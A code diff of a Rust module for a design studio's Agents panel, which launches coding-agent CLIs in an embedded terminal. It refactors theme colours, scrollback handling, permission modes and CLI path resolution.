@@ -1,16 +1,10 @@
-//! Native Embedded PTY Agent Terminal Runtime (`claude`, `codex`, `grok`, `$SHELL`)
-//! and Bidirectional Canvas <-> Terminal Spec Bridge (the Agents panel).
-//!
-//! Crafted to `es:designer` (`craft-floor.md` + `tokens.css`) and **EaseUI BrainWave 2.0**:
-//! - Zero emoji icons (`§2 Refuse by default`): uses crisp Lucide vector glyphs (`crate::icons::Icon`)
-//! - Surface steps: `#0E0E12` viewport -> `#16171B` base -> `#1F2024` raised -> `#26272C` hover
-//! - 1px hairlines (`#2A2B31`) instead of nested cards-in-cards
-//! - Concentric radii (`12px` outer surface, `6px` inner controls)
-//! - Semantic status pills (`OK #4CC58B`, `WARN #E0A53C`, `BAD #FF7A8C`, `INFO #8FB0FF`)
+//! Agents panel: a PTY for claude, codex, grok and the shell, and the canvas bridge.
+//! Chrome colours are theme aliases. Cell text, selection and the cursor keep their own values.
 
 #![allow(dead_code)]
 
 use crate::agent_session_failure::{self, BannerEvent, SessionFailure, SessionFailureClass};
+use crate::agent_session_files::ExactProjectConfig;
 use crate::agent_start_failure::{self, FixAction, StartFailure};
 use crate::icons::{self, Icon};
 use crate::panels::clipped;
@@ -26,38 +20,183 @@ use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 
-// EaseUI BrainWave 2.0 + es:designer Craft Floor Surface & Hairline Tokens
-pub const TERM_BG_VIEWPORT: Color32 = Color32::from_rgb(0x0E, 0x0E, 0x12);
-pub const TERM_BG_BAR: Color32 = Color32::from_rgb(0x16, 0x17, 0x1B);
-pub const TERM_BG_ELEVATED: Color32 = Color32::from_rgb(0x1F, 0x20, 0x24);
-pub const TERM_BG_HOVER: Color32 = Color32::from_rgb(0x26, 0x27, 0x2C);
-pub const TERM_BORDER: Color32 = Color32::from_rgb(0x2A, 0x2B, 0x31);
-pub const TERM_ORANGE: Color32 = Color32::from_rgb(0xFF, 0x6A, 0x3D);
-#[allow(dead_code)]
-pub const TERM_ORANGE_BG: Color32 = Color32::from_rgb(0x36, 0x1A, 0x12);
+pub const TERM_BG_VIEWPORT: Color32 = theme::BG;
+pub const TERM_BG_BAR: Color32 = theme::BG_PRIMARY;
+pub const TERM_BG_ELEVATED: Color32 = theme::BG_SECONDARY;
+pub const TERM_BG_HOVER: Color32 = theme::BG_HOVER;
+pub const TERM_BORDER: Color32 = theme::BORDER;
+pub const TERM_ORANGE: Color32 = theme::BORDER_SELECTED;
 pub const TERM_FG_DEFAULT: Color32 = Color32::from_rgb(0xE4, 0xE4, 0xE7);
 pub const TERM_SELECTION_BG: Color32 = Color32::from_rgb(0x5A, 0x78, 0x98);
 
-// Semantic Status Pill Tokens (`es:designer` tokens.css)
-pub const STATUS_OK_TEXT: Color32 = Color32::from_rgb(0x4C, 0xC5, 0x8B);
-pub const STATUS_OK_BG: Color32 = Color32::from_rgb(0x17, 0x30, 0x2A);
-pub const STATUS_OK_BORDER: Color32 = Color32::from_rgb(0x2C, 0x5F, 0x4A);
+pub const STATUS_OK_TEXT: Color32 = theme::BADGE_SUCCESS_TEXT;
+pub const STATUS_OK_BG: Color32 = theme::BG_SUCCESS_PRIMARY;
+pub const STATUS_OK_BORDER: Color32 = theme::BADGE_SUCCESS_BORDER;
 
-pub const STATUS_WARN_TEXT: Color32 = Color32::from_rgb(0xE0, 0xA5, 0x3C);
-pub const STATUS_WARN_BG: Color32 = Color32::from_rgb(0x35, 0x29, 0x1A);
-pub const STATUS_WARN_BORDER: Color32 = Color32::from_rgb(0x5C, 0x47, 0x20);
+pub const STATUS_WARN_TEXT: Color32 = theme::BADGE_WARNING_TEXT;
+pub const STATUS_WARN_BG: Color32 = theme::BG_WARNING_PRIMARY;
+pub const STATUS_WARN_BORDER: Color32 = theme::BADGE_WARNING_BORDER;
 
-pub const STATUS_BAD_TEXT: Color32 = Color32::from_rgb(0xFF, 0x7A, 0x8C);
-pub const STATUS_BAD_BG: Color32 = Color32::from_rgb(0x3B, 0x1D, 0x23);
-pub const STATUS_BAD_BORDER: Color32 = Color32::from_rgb(0x6A, 0x2E, 0x39);
+pub const STATUS_BAD_TEXT: Color32 = theme::BADGE_ERROR_TEXT;
+pub const STATUS_BAD_BG: Color32 = theme::BG_ERROR_PRIMARY;
+pub const STATUS_BAD_BORDER: Color32 = theme::BADGE_ERROR_BORDER;
 
-pub const STATUS_INFO_TEXT: Color32 = Color32::from_rgb(0x8F, 0xB0, 0xFF);
-pub const STATUS_INFO_BG: Color32 = Color32::from_rgb(0x1B, 0x26, 0x40);
-pub const STATUS_INFO_BORDER: Color32 = Color32::from_rgb(0x2F, 0x45, 0x77);
+pub const STATUS_INFO_TEXT: Color32 = theme::STATUS_INFO_TEXT;
+pub const STATUS_INFO_BG: Color32 = theme::STATUS_INFO_BG;
+pub const STATUS_INFO_BORDER: Color32 = theme::STATUS_INFO_BORDER;
+
+/// Session tab bar. Tabs, Stop, new chat and more sit in this one row.
+pub const TERMINAL_HEADER_H: f32 = 36.0;
+/// Turn receipt strip between the viewport and the composer.
+pub const TERMINAL_RECEIPT_H: f32 = 24.0;
 
 const CHAR_W: f32 = 7.8;
 const ROW_H: f32 = 16.0;
 const MAX_RAW_LOG_BYTES: usize = 128 * 1024;
+const TERM_SCROLLBACK_LINES: usize = 5000;
+const TERM_MIN_ROWS: u16 = 4;
+const TERM_MAX_ROWS: u16 = 120;
+const TERM_MIN_COLS: u16 = 16;
+const TERM_MAX_COLS: u16 = 320;
+/// Debounce window (`120 ms`) before a viewport resize is forwarded to the OS PTY and `vt100` parser (`#1171` R1).
+pub const RESIZE_DEBOUNCE_SECS: f64 = 0.120;
+
+/// Returns the current number of lines stored in `parser`'s scrollback buffer in O(1) without allocating (`#1171`).
+pub(crate) fn parser_scrollback_len(parser: &mut vt100::Parser) -> usize {
+    let prev = parser.screen().scrollback();
+    parser.set_scrollback(usize::MAX);
+    let len = parser.screen().scrollback();
+    parser.set_scrollback(prev);
+    len
+}
+
+/// Runs `f` on `parser.screen()` while working around `vt100 0.15.2`'s `rows_len - self.scrollback_offset`
+/// subtraction in `Grid::visible_rows` when `scrollback_offset > rows` (`#1171`).
+///
+/// In debug builds (`cfg(debug_assertions)`), overflow checks are enabled and `rows_len - self.scrollback_offset`
+/// panics whenever `scrollback_offset > rows`, so we temporarily widen `parser` to `offset` rows for `f`.
+/// In release builds (`cfg(not(debug_assertions))`), overflow checks are off: `rows_len - self.scrollback_offset`
+/// wraps to a large `usize`, and because `self.scrollback.iter().skip(scrollback_len - self.scrollback_offset)`
+/// already yields `scrollback_offset` (`> rows`) rows before the chained `self.rows.iter().take(...)`,
+/// `take()` yields the same visible rows with zero per-frame allocation.
+pub(crate) fn with_scrollback_safe_screen<R>(parser: &mut vt100::Parser, f: impl FnOnce(&vt100::Screen) -> R) -> R {
+    #[cfg(debug_assertions)]
+    let restore = {
+        let (rows, cols) = parser.screen().size();
+        let offset = parser.screen().scrollback();
+        if offset > usize::from(rows) && offset <= usize::from(u16::MAX) {
+            parser.set_size(offset as u16, cols);
+            Some((rows, cols))
+        } else {
+            None
+        }
+    };
+    let out = f(parser.screen());
+    #[cfg(debug_assertions)]
+    if let Some((rows, cols)) = restore {
+        parser.set_size(rows, cols);
+    }
+    out
+}
+
+/// Clears `parser`'s scrollback buffer on `ESC[3J` / `ESC[?3J` (`ED 3`) while keeping the visible
+/// screen, cursor position, active SGR attributes, input modes, title, and alternate screen intact (`#1171` R2).
+pub(crate) fn clear_parser_scrollback(parser: &mut vt100::Parser) {
+    let (rows, cols) = parser.screen().size();
+    if parser.screen().alternate_screen() {
+        let alt_state = parser.screen().state_formatted();
+        parser.process(b"\x1b[?47l");
+        parser.set_scrollback(0);
+        let main_state = parser.screen().state_formatted();
+        let mut fresh = vt100::Parser::new(rows, cols, TERM_SCROLLBACK_LINES);
+        fresh.process(&main_state);
+        fresh.process(b"\x1b[?47h");
+        fresh.process(&alt_state);
+        *parser = fresh;
+    } else {
+        parser.set_scrollback(0);
+        let main_state = parser.screen().state_formatted();
+        let mut fresh = vt100::Parser::new(rows, cols, TERM_SCROLLBACK_LINES);
+        fresh.process(&main_state);
+        *parser = fresh;
+    }
+}
+
+/// Advances the `ESC[3J` / `ESC[?3J` (`ED 3`) byte scanner by one byte and returns `true` when the final `'J'` is reached.
+#[inline]
+fn advance_esc3j_scanner(state: &mut u8, b: u8) -> bool {
+    match (*state, b) {
+        (_, 0x1b) => {
+            *state = 1;
+            false
+        }
+        (1, b'[') => {
+            *state = 2;
+            false
+        }
+        (2, b'?') | (2, b'0') | (3, b'0') => {
+            *state = 3;
+            false
+        }
+        (2 | 3, b'3') => {
+            *state = 4;
+            false
+        }
+        (4, b'J') => {
+            *state = 0;
+            true
+        }
+        _ => {
+            *state = 0;
+            false
+        }
+    }
+}
+
+/// Feeds PTY output bytes into `parser`, honouring `ESC[3J` / `ESC[?3J` to clear the scrollback buffer (`#1171` R2)
+/// and preserving a non-zero user scrollback reading position across `ESC[3J` full-history reprints.
+pub(crate) fn process_pty_bytes(parser: &mut vt100::Parser, bytes: &[u8], esc3j_state: &mut u8, restore_scrollback: &std::sync::atomic::AtomicUsize) {
+    let mut seg_start = 0usize;
+    let mut saw_esc3j = false;
+    for (i, &b) in bytes.iter().enumerate() {
+        if advance_esc3j_scanner(esc3j_state, b) {
+            let cur_sb = parser.screen().scrollback();
+            if cur_sb > 0 {
+                restore_scrollback.store(cur_sb, std::sync::atomic::Ordering::Release);
+            }
+            if restore_scrollback.load(std::sync::atomic::Ordering::Acquire) > 0 {
+                parser.set_scrollback(0);
+            }
+            parser.process(&bytes[seg_start..=i]);
+            clear_parser_scrollback(parser);
+            seg_start = i + 1;
+            saw_esc3j = true;
+        }
+    }
+    if seg_start < bytes.len() {
+        if restore_scrollback.load(std::sync::atomic::Ordering::Acquire) > 0 {
+            parser.set_scrollback(0);
+        }
+        parser.process(&bytes[seg_start..]);
+    }
+    let target = restore_scrollback.load(std::sync::atomic::Ordering::Acquire);
+    if target > 0 {
+        let new_len = parser_scrollback_len(parser);
+        parser.set_scrollback(target.min(new_len));
+        if new_len >= target && (!saw_esc3j || seg_start < bytes.len()) {
+            restore_scrollback.store(0, std::sync::atomic::Ordering::Release);
+        }
+    }
+}
+
+/// The status line of a tab whose process could not start: the error, and what was moved aside for the start before it failed (the
+/// entries stay moved whether or not the tab came up).
+fn pty_error_line(error: &str, set_aside_note: Option<&str>) -> String {
+    match set_aside_note {
+        Some(note) => format!("PTY error: {error}. {note}"),
+        None => format!("PTY error: {error}"),
+    }
+}
 
 /// The command an agent tab runs when its caller prepared none. Every tab Studio starts passes a mode-aware command, so
 /// this is only the safety net behind a future caller that forgets to, and it asks: the plain
@@ -81,6 +220,12 @@ macro_rules! codex_mcp_overrides {
     };
 }
 
+/// Removes the per-session MCP overrides when an untitled design has no private workspace. The
+/// prefix (including `codex resume` and its permission flags) remains intact.
+fn strip_codex_mcp_overrides(command: &str) -> String {
+    command.split_once(" -c 'mcp_servers.designos.command=").map_or_else(|| command.to_string(), |(prefix, _)| prefix.to_string())
+}
+
 /// The command behind the `--panel agents-start-failure` screenshot fixture. `agy` rejects `--mcp-config` and
 /// exits at once, which is what the failure panel shows. It must never carry a skip or bypass flag: it runs
 /// whatever the user's permission mode is (`#841`).
@@ -95,6 +240,9 @@ pub enum PermissionMode {
     /// Ask for approval using the CLI's default interactive mode (default in Studio).
     #[default]
     Ask,
+    /// Read and additive designos tools run. Modify, destructive, and external tools ask.
+    /// A modify call can be allowed for this session. Unknown tools ask.
+    AskRisky,
 }
 
 /// An agent CLI a sample-prompt click can start (`#688`).
@@ -224,6 +372,11 @@ impl AgentCliPreset {
         !matches!(self, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp)
     }
 
+    /// True when turn status is derived from the PTY output heuristic rather than `agent-events.jsonl` hooks (`#1194`).
+    pub const fn uses_pty_heuristic(self) -> bool {
+        matches!(self, AgentCliPreset::Codex)
+    }
+
     /// True when this preset reserves `Ctrl+Z` inside the terminal on Windows/Linux (`#685`).
     pub fn uses_ctrl_z(self) -> bool {
         crate::terminal_undo_chord::preset_ctrl_z_policy(self).1
@@ -234,15 +387,15 @@ impl AgentCliPreset {
     pub fn permission_flags(self, mode: PermissionMode) -> &'static [&'static str] {
         match (self, mode) {
             (AgentCliPreset::Claude, PermissionMode::Skip) => &["--dangerously-skip-permissions"],
-            (AgentCliPreset::Claude, PermissionMode::Ask) => &[],
+            (AgentCliPreset::Claude, PermissionMode::Ask | PermissionMode::AskRisky) => &[],
             (AgentCliPreset::Codex, PermissionMode::Skip) => &["--dangerously-bypass-approvals-and-sandbox"],
-            (AgentCliPreset::Codex, PermissionMode::Ask) => &[],
+            (AgentCliPreset::Codex, PermissionMode::Ask | PermissionMode::AskRisky) => &[],
             (AgentCliPreset::Grok, PermissionMode::Skip) => &["--always-approve"],
-            (AgentCliPreset::Grok, PermissionMode::Ask) => &[],
+            (AgentCliPreset::Grok, PermissionMode::Ask | PermissionMode::AskRisky) => &[],
             (AgentCliPreset::Antigravity, PermissionMode::Skip) => &["--dangerously-skip-permissions"],
-            (AgentCliPreset::Antigravity, PermissionMode::Ask) => &[],
+            (AgentCliPreset::Antigravity, PermissionMode::Ask | PermissionMode::AskRisky) => &[],
             (AgentCliPreset::Gemini, PermissionMode::Skip) => &["--approval-mode", "yolo"],
-            (AgentCliPreset::Gemini, PermissionMode::Ask) => &["--approval-mode", "default"],
+            (AgentCliPreset::Gemini, PermissionMode::Ask | PermissionMode::AskRisky) => &["--approval-mode", "default"],
             (AgentCliPreset::OpenCode | AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp, _) => &[],
         }
     }
@@ -253,19 +406,19 @@ impl AgentCliPreset {
             (AgentCliPreset::Claude, PermissionMode::Skip) => {
                 "claude --dangerously-skip-permissions --mcp-config \"$DESIGNOS_MCP_CONFIG\" --settings \"$DESIGNOS_SESSION_DIR/hooks.json\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
             }
-            (AgentCliPreset::Claude, PermissionMode::Ask) => {
-                "claude --mcp-config \"$DESIGNOS_MCP_CONFIG\" --settings \"$DESIGNOS_SESSION_DIR/hooks.json\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
+            (AgentCliPreset::Claude, PermissionMode::Ask | PermissionMode::AskRisky) => {
+                "claude --mcp-config \"$DESIGNOS_CLAUDE_MCP_CONFIG\" --settings \"$DESIGNOS_CLAUDE_SETTINGS\" --setting-sources user --plugin-dir \"$DESIGNOS_CLAUDE_PLUGIN\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
             }
             (AgentCliPreset::Codex, PermissionMode::Skip) => concat!("codex --dangerously-bypass-approvals-and-sandbox", codex_mcp_overrides!()),
-            (AgentCliPreset::Codex, PermissionMode::Ask) => concat!("codex", codex_mcp_overrides!()),
+            (AgentCliPreset::Codex, PermissionMode::Ask | PermissionMode::AskRisky) => concat!("codex", codex_mcp_overrides!()),
             (AgentCliPreset::Grok, PermissionMode::Skip) => "grok --always-approve --cwd \"$DESIGNOS_SESSION_DIR\"",
-            (AgentCliPreset::Grok, PermissionMode::Ask) => "grok --cwd \"$DESIGNOS_SESSION_DIR\"",
+            (AgentCliPreset::Grok, PermissionMode::Ask | PermissionMode::AskRisky) => "grok --cwd \"$DESIGNOS_SESSION_DIR\"",
             (AgentCliPreset::Antigravity, PermissionMode::Skip) => "agy --dangerously-skip-permissions --add-dir \"$DESIGNOS_SESSION_DIR\"",
-            (AgentCliPreset::Antigravity, PermissionMode::Ask) => "agy --add-dir \"$DESIGNOS_SESSION_DIR\"",
+            (AgentCliPreset::Antigravity, PermissionMode::Ask | PermissionMode::AskRisky) => "agy --add-dir \"$DESIGNOS_SESSION_DIR\"",
             // `gemini` reads `<session_dir>/.gemini/settings.json` from its cwd (written by
             // `write_gemini_session_config`) and never touches `~/.gemini/settings.json`.
             (AgentCliPreset::Gemini, PermissionMode::Skip) => "gemini --approval-mode yolo --include-directories \"$DESIGNOS_SESSION_DIR\"",
-            (AgentCliPreset::Gemini, PermissionMode::Ask) => "gemini --approval-mode default --include-directories \"$DESIGNOS_SESSION_DIR\"",
+            (AgentCliPreset::Gemini, PermissionMode::Ask | PermissionMode::AskRisky) => "gemini --approval-mode default --include-directories \"$DESIGNOS_SESSION_DIR\"",
             // `opencode` starts in `session_dir` (`opencode <project>`).
             (AgentCliPreset::OpenCode, _) => "opencode \"$DESIGNOS_SESSION_DIR\"",
             (AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp, _) => "",
@@ -333,9 +486,8 @@ pub fn extra_cli_path_dirs() -> Vec<PathBuf> {
 
 /// Checks if `bin` exists as an executable file in `PATH` (or common user/system CLI directories, or as an explicit path).
 pub fn runtime_binary_available(bin: &str) -> bool {
-    let path_os = std::env::var_os("PATH");
-    let include_default_dirs = !path_os.as_ref().is_some_and(|p| p.is_empty());
-    runtime_binary_available_in(bin, path_os.as_deref(), include_default_dirs)
+    let include_default_dirs = !crate::cli_resolve::host_path_is_empty();
+    runtime_binary_available_in(bin, None, include_default_dirs)
 }
 
 fn runtime_binary_available_in(bin: &str, path_os: Option<&std::ffi::OsStr>, include_default_dirs: bool) -> bool {
@@ -344,27 +496,33 @@ fn runtime_binary_available_in(bin: &str, path_os: Option<&std::ffi::OsStr>, inc
         return false;
     }
     let explicit = Path::new(trimmed);
+    if path_os.is_none() {
+        if let Some(ref hdir) = crate::cli_resolve::hermetic_agent_cli_dir() {
+            if explicit.components().count() > 1 {
+                return false;
+            }
+            return crate::cli_resolve::resolve_in_hermetic(hdir, trimmed).is_some();
+        }
+    }
     if explicit.components().count() > 1 {
         return explicit.is_file();
     }
 
-    let mut dirs: Vec<PathBuf> = Vec::new();
-    if let Some(p_os) = path_os {
-        for p in std::env::split_paths(p_os) {
-            if !p.as_os_str().is_empty() {
-                dirs.push(p);
-            }
+    let dirs = if let Some(p_os) = path_os {
+        let mut dirs = crate::cli_resolve::split_non_empty_paths(p_os);
+        if include_default_dirs {
+            dirs.extend(extra_cli_path_dirs());
         }
-    }
-    if include_default_dirs {
-        dirs.extend(extra_cli_path_dirs());
-    }
+        dirs
+    } else {
+        let mut sources = crate::cli_resolve::current_search_sources(None);
+        if !include_default_dirs {
+            sources.extra.clear();
+        }
+        crate::cli_resolve::cli_search_dirs_with(&sources)
+    };
 
-    dirs.into_iter().any(|d| {
-        d.join(trimmed).is_file()
-            || (cfg!(windows)
-                && (d.join(format!("{trimmed}.exe")).is_file() || d.join(format!("{trimmed}.cmd")).is_file() || d.join(format!("{trimmed}.bat")).is_file()))
-    })
+    crate::cli_resolve::resolve_in(&dirs, trimmed).is_some()
 }
 
 /// Per-file isolated session environment paths and active document/page metadata.
@@ -388,15 +546,24 @@ pub struct SessionEnv {
     pub doc_name: String,
     pub path_prepend: Vec<PathBuf>,
     pub tab_session_uuid: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_MCP_CONFIG`, which an Ask-mode Claude launch passes as `--mcp-config` (`None` in Skip mode).
+    pub claude_mcp_config: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_SETTINGS`, which an Ask-mode Claude launch passes as `--settings` (`None` in Skip mode).
+    pub claude_settings: Option<String>,
+    /// Value of `GEMINI_CLI_SYSTEM_DEFAULTS_PATH` for a Gemini tab: the private status-hooks file written for it. `None` when
+    /// there is none, and then the variable is left as Studio's own environment holds it.
+    pub gemini_system_defaults: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_PLUGIN`, which an Ask-mode Claude launch passes as `--plugin-dir` (`None` in Skip mode).
+    pub claude_plugin: Option<String>,
     #[cfg(test)]
     pub path_override: Option<std::ffi::OsString>,
 }
 
 impl SessionEnv {
-    #[allow(dead_code)]
+    #[cfg(test)]
     pub fn for_session_id(session_id: &str) -> Self {
         let clean = if session_id.trim().is_empty() { "tab-1" } else { session_id.trim() };
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(clean);
         Self {
             session_id: clean.to_string(),
             run_id: format!("{clean}-1-1"),
@@ -415,6 +582,10 @@ impl SessionEnv {
             doc_name: "Untitled".to_string(),
             path_prepend: Vec::new(),
             tab_session_uuid: None,
+            claude_mcp_config: None,
+            claude_settings: None,
+            claude_plugin: None,
+            gemini_system_defaults: None,
             #[cfg(test)]
             path_override: None,
         }
@@ -449,6 +620,8 @@ pub enum TerminalAction {
     CloseStoppedTurn { tab_id: usize, turn_start_depth: usize, run_id: Option<String> },
     /// Clears `Document.in_progress` entries owned by an agent run that finished (`agent-status.json` -> `done`) or whose PTY exited.
     ClearInProgress { run_id: Option<String>, agent: Option<String> },
+    /// Saves the permission mode used for new agent tabs.
+    SetAgentPermissionMode(crate::agent_permissions::AgentPermissionMode),
 }
 
 /// Label of a wait on a pending approval (owner status set, 2026-10-21). Producers, the Sessions row matcher and the pill share it.
@@ -524,6 +697,11 @@ pub struct TerminalTab {
     /// When set, the PTY reader also reports an approval prompt in the output as `WaitingForInput` for a tab whose
     /// status otherwise comes from hook events: Antigravity in `Ask` mode has no permission hook (`#656`).
     pub pty_waiting_heuristic: Arc<std::sync::atomic::AtomicBool>,
+    /// What a Gemini CLI tab's confirmation dialog on screen says about its wait (`gemini_dialog`).
+    pub gemini: crate::gemini_dialog::GeminiTabState,
+    /// Bumped each time the screen changes: after the reader thread has fed a chunk to `parser`, and on a resize. A reader of the
+    /// screen that saw the same number last time has nothing new to read (`gemini_dialog`).
+    pub screen_rev: Arc<std::sync::atomic::AtomicU64>,
     /// Timestamp when the child process was first observed dead while waiting for `reader_eof`.
     pub exited_at: Option<std::time::Instant>,
     /// Per-tab ledger of agent canvas turns (`#677`).
@@ -536,8 +714,9 @@ pub struct TerminalTab {
     pub turn_tracker: crate::agent_turn_status::TabTurnTracker,
     /// Permission mode active when this tab was spawned (`#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Per-tab approvals directory `<session_dir>/approvals/tab-<id>` (`#656`).
-    pub approvals_dir: PathBuf,
+    /// Per-tab approvals folder in the session's Studio-private channel (`agent_approval_channel`), where the tab's hook raises
+    /// requests and Studio answers them. `None` for a tab without a session, and when the platform has no private folder.
+    pub approvals_dir: Option<PathBuf>,
     /// Pending approval requests queued for this tab (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
     /// Active stop sequence state (`#684`), or `None` when not stopping.
@@ -570,6 +749,55 @@ pub struct TerminalTab {
     pub last_user_prompt: Option<String>,
     /// Current uncommitted interactive line typed into the VT100 viewport before `Enter`.
     pub input_line_buffer: String,
+    /// Number of PTY and parser resizes applied to this tab (`#1171`).
+    pub resize_count: usize,
+    /// Candidate `(rows, cols)` and frame timestamp (`s`) waiting for the `120 ms` debounce window (`#1171` R1).
+    pub pending_resize: Option<((u16, u16), f64)>,
+    /// Scrollback offset to restore across an `ESC[3J` full-history reprint when the user was scrolled into history (`#1171`).
+    pub restore_scrollback: Arc<std::sync::atomic::AtomicUsize>,
+}
+
+/// Quiet window after which a PTY-heuristic tab (`Codex`) decays an explicit `Working(_)` into `Done` (`#1194`).
+pub const PTY_HEURISTIC_WORKING_DECAY: std::time::Duration = std::time::Duration::from_millis(1_500);
+
+/// Activity window during which recent PTY output promotes `Idle`/`Done` to `Working(None)` on a PTY-heuristic tab.
+pub const PTY_HEURISTIC_ACTIVITY_WINDOW: std::time::Duration = std::time::Duration::from_millis(600);
+
+/// Pure status resolver for PTY-heuristic presets (`Codex`, `#1194`).
+///
+/// - `Working(detail)` stays `Working(detail)` while the PTY has produced output within [`PTY_HEURISTIC_WORKING_DECAY`]
+///   (or before the first PTY output timestamp is recorded), and decays to [`AgentTabStatus::Done`] once the PTY
+///   has been quiet for at least `1.5 s`.
+/// - `WaitingForInput` never decays (an approval menu is static).
+/// - `Stopped` and `Error` keep their precedence unchanged.
+/// - `Idle` and `Done` become `Working(None)` when PTY output arrived within [`PTY_HEURISTIC_ACTIVITY_WINDOW`] (`600 ms`).
+pub fn resolve_pty_heuristic_status(explicit_status: AgentTabStatus, last_output_at: Option<std::time::Instant>, now: std::time::Instant) -> AgentTabStatus {
+    let quiet_duration = last_output_at.map(|ts| now.saturating_duration_since(ts));
+    let recent_pty_activity = quiet_duration.is_some_and(|d| d < PTY_HEURISTIC_ACTIVITY_WINDOW);
+    match explicit_status {
+        AgentTabStatus::Working(detail) => {
+            if quiet_duration.is_some_and(|d| d >= PTY_HEURISTIC_WORKING_DECAY) {
+                AgentTabStatus::Done
+            } else {
+                AgentTabStatus::Working(detail)
+            }
+        }
+        AgentTabStatus::WaitingForInput(detail) => AgentTabStatus::WaitingForInput(detail),
+        // A stopped or errored tab keeps its status even if trailing PTY bytes arrive (`#684`, `#1194`).
+        AgentTabStatus::Stopped => AgentTabStatus::Stopped,
+        AgentTabStatus::Error(detail) => AgentTabStatus::Error(detail),
+        other if recent_pty_activity => AgentTabStatus::Working(None),
+        other => other,
+    }
+}
+
+/// Explicit status the PTY-heuristic poll writes back (`#1194`).
+///
+/// Recent PTY bytes promote `Idle`/`Done` to `Working(None)` for display inside
+/// [`resolve_pty_heuristic_status`]. That promotion is not a turn: only a quiet `Working(_)`
+/// decays to an explicit `Done`. Composer echo must not become `Working`, and `Idle` must not either.
+fn persisted_pty_heuristic_status(explicit: &AgentTabStatus, effective: &AgentTabStatus) -> Option<AgentTabStatus> {
+    matches!((explicit, effective), (AgentTabStatus::Working(_), AgentTabStatus::Done)).then(|| effective.clone())
 }
 
 impl TerminalTab {
@@ -578,8 +806,8 @@ impl TerminalTab {
         if !self.pending_approvals.is_empty() {
             return true;
         }
-        self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask
-            && matches!(self.preset, AgentCliPreset::Codex | AgentCliPreset::Grok | AgentCliPreset::Antigravity)
+        matches!(self.permission_mode, crate::agent_permissions::AgentPermissionMode::Ask | crate::agent_permissions::AgentPermissionMode::AskRisky)
+            && matches!(self.preset, AgentCliPreset::Codex | AgentCliPreset::Grok | AgentCliPreset::Antigravity | AgentCliPreset::Gemini)
             && self.agent_status.lock().ok().is_some_and(|g| matches!(*g, AgentTabStatus::WaitingForInput(_)))
     }
 
@@ -619,8 +847,8 @@ impl TerminalTab {
         session: Option<&SessionEnv>,
         cmd_override: Option<CommandBuilder>,
     ) -> Result<Self, String> {
-        let rows = rows.max(6);
-        let cols = cols.max(20);
+        let rows = rows.max(TERM_MIN_ROWS);
+        let cols = cols.max(TERM_MIN_COLS);
         agent_session_failure::warm_cli_version_cache(preset);
         let pty_system = native_pty_system();
         let pair = pty_system.openpty(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 }).map_err(|e| format!("openpty failed: {e}"))?;
@@ -630,23 +858,7 @@ impl TerminalTab {
             None => {
                 let shell_bin = default_shell_program();
                 match preset {
-                    AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp => {
-                        let mut c = CommandBuilder::new(&shell_bin);
-                        if cfg!(test) {
-                            if shell_bin.ends_with("zsh") {
-                                c.arg("-d");
-                                c.arg("-f");
-                                #[cfg(test)]
-                                isolate_zsh_from_home(&mut c);
-                            } else if shell_bin.ends_with("bash") || shell_bin.ends_with("bash.exe") {
-                                c.arg("--norc");
-                                c.arg("--noprofile");
-                            }
-                        } else if !cfg!(windows) {
-                            c.arg("-l");
-                        }
-                        c
-                    }
+                    AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp => build_shell_preset_cmd(&shell_bin),
                     AgentCliPreset::Claude
                     | AgentCliPreset::Codex
                     | AgentCliPreset::Antigravity
@@ -656,7 +868,8 @@ impl TerminalTab {
                         #[cfg(test)]
                         let launch_cmd = if session.and_then(|s| s.path_override.as_ref()).is_none()
                             && std::env::var_os("DESIGNOS_QA_DIR").is_none()
-                            && !std::env::var_os("PATH").is_some_and(|p| p.is_empty())
+                            && crate::cli_resolve::hermetic_agent_cli_dir().is_none()
+                            && !crate::cli_resolve::host_path_is_empty()
                         {
                             "sh -c 'sleep 5'"
                         } else {
@@ -664,23 +877,30 @@ impl TerminalTab {
                         };
                         #[cfg(not(test))]
                         let launch_cmd = fallback_agent_launch_command(preset);
-                        build_agent_shell_cmd(&shell_bin, launch_cmd)
+                        build_agent_shell_cmd_checked_for_tab(&shell_bin, launch_cmd, preset, file_path, session)?
                     }
                 }
             }
         };
 
         if let Some(sess) = session {
-            for lock_name in ["agent-events.jsonl.lock", "agent-status.jsonl.lock", "agent-status.json.lock"] {
-                let _ = std::fs::remove_dir_all(sess.session_dir.join(lock_name));
+            // A lock a hook that was killed left behind in the hook folder (`agent_hook_outputs`) would make the next append wait.
+            let hook_dir = crate::agent_hook_outputs::HookPaths::locate(&sess.session_dir);
